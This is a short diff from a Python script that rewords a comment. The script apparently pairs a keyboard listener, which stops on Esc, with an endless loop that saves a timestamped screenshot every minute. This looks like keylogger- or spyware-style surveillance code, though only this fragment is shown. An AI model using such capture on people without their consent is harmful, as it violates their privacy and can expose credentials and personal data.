@@ -21,7 +21,7 @@ def onRelease(key):
     if key == Key.esc:
         return False
 
-#Every 1min a screenshot of the screen is taken and images are stored in the Images directory as pngs with the timestamp
+#Every minute a screenshot is taken and stored in an Images directory with the timestamp of when the screenshot was taken
 def captureScreenshot():
     while True:
         screenshot = ImageGrab.grab()
